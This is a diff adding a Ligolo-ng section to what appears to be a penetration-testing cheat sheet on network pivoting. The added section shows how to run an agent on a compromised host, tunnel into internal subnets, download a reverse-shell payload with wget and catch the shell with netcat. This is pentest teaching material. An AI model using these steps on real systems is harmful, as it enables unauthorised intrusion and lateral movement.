@@ -345,6 +345,62 @@ chisel server <span class="nt">-p</span> 1234 <span class="nt">--socks5</span>
 chisel client <span class="nt">--max-retry-count</span> 5 &lt;target IP&gt;:1234 &lt;proxychains_port&gt;:socks
 </code></pre></div>
 
+<h2>Ligolo-ng</h2>
+
+<h3>Initial setup and reverse pivot</h3>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># After downloading ligolo-ng here: https://github.com/nicocha30/ligolo-ng</span>
+<span class="c"># And renaming the "proxy" and "agent" binaries with "ligolo" and "ligolo-agent" respectively, set up a tun interface for ligolo:</span>
+<span class="nb">sudo </span>ip tuntap add user <span class="s2">"</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">"</span> mode tun <span class="s2">"</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">"</span>
+<span class="nb">sudo </span>ip <span class="nb">link set</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">"</span> up
+
+<span class="c"># Start up ligolo proxy, with letsencrypt certificate:</span>
+ligolo <span class="nt">-autocert</span>
+
+<span class="c"># Or with a self-signed certificate:</span>
+ligolo <span class="nt">-selfcert</span>
+
+<span class="c"># On target machine, upload the agent and run it to our attack box:</span>
+./ligolo-agent <span class="nt">-connect</span> &lt;attack box IP&gt;:11601
+
+<span class="c"># From our ligolo proxy interface, start the tunnel:</span>
+start
+
+<span class="c"># Add the desired subnet we want to enumerate / exploit from our target:</span>
+<span class="nb">sudo </span>ip route add &lt;target subnet address&gt;/24 dev <span class="s2">"</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">"</span>
+
+<span class="c"># We can now talk directly to the internal subnet:</span>
+ping <span class="nt">-c</span> 5 &lt;IP from target subnet&gt;
+
+<span class="c"># Once done, delete the tun interface:</span>
+<span class="nb">sudo </span>ip tuntap del mode tun <span class="s2">"</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">"</span>
+</code></pre></div>
+
+<h3>Reverse shell with double pivot</h3>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># From our ligolo proxy interface, forward traffic from compromised target</span>
+<span class="c"># to our attack box, with specific ports:</span>
+listener_add <span class="nt">--addr</span> 0.0.0.0:&lt;compromised target port&gt; <span class="nt">--to</span> 127.0.0.1:&lt;attack box port&gt; <span class="nt">--tcp</span>
+
+<span class="c"># This allows any internal target to talk to our attack box,</span>
+<span class="c"># for instance with a local python3 HTTP server:</span>
+python3 <span class="nt">-m</span> http.server 8080
+
+<span class="c"># And from the desired internal target:</span>
+wget http://&lt;compromised target IP&gt;:&lt;compromised target port&gt;/&lt;reverse shell payload&gt;
+
+<span class="c"># Now, let's establish a reverse shell.</span>
+<span class="c"># Create a new listener on ligolo proxy interface:</span>
+listener_add <span class="nt">--addr</span> 0.0.0.0:&lt;compromised target port&gt; <span class="nt">--to</span> 127.0.0.1:&lt;attack box port&gt; <span class="nt">--tcp</span>
+
+<span class="c"># Set up a listener:</span>
+rlwrap nc <span class="nt">-lvnp</span> &lt;attack box port&gt;
+
+<span class="c"># Call our reverse shell from internal target</span>
+<span class="c"># and catch a shell:</span>
+./&lt;reverse shell payload&gt;
+</code></pre></div>
+
 <h2>Proxied commands</h2>
 
 <div class="highlight"><pre class="highlight shell"><code><span class="c"># Classic nmap full TCP connect scan without ping:</span>
@@ -360,6 +416,7 @@ chisel client <span class="nt">--max-retry-count</span> 5 &lt;target IP&gt;:1234
 <li><a href="https://scribe.rip/geekculture/chisel-network-tunneling-on-steroids-a28e6273c683" rel="nofollow">https://scribe.rip/geekculture/chisel-network-tunneling-on-steroids-a28e6273c683</a></li>
 <li><a href="https://old.reddit.com/r/oscp/comments/1akvtwe/ligolo_chisel_and_painfully_slow_nmap_scans/" rel="nofollow">https://old.reddit.com/r/oscp/comments/1akvtwe/ligolo_chisel_and_painfully_slow_nmap_scans/</a></li>
 <li><a href="https://bramleysec.com/2025/02/15/part-3-getting-a-reverse/" rel="nofollow">https://bramleysec.com/2025/02/15/part-3-getting-a-reverse/</a></li>
+<li><a href="https://techyrick.com/ligolo-ng-pivoting-full-tutorial/" rel="nofollow">https://techyrick.com/ligolo-ng-pivoting-full-tutorial/</a></li>
 </ul>
 
     
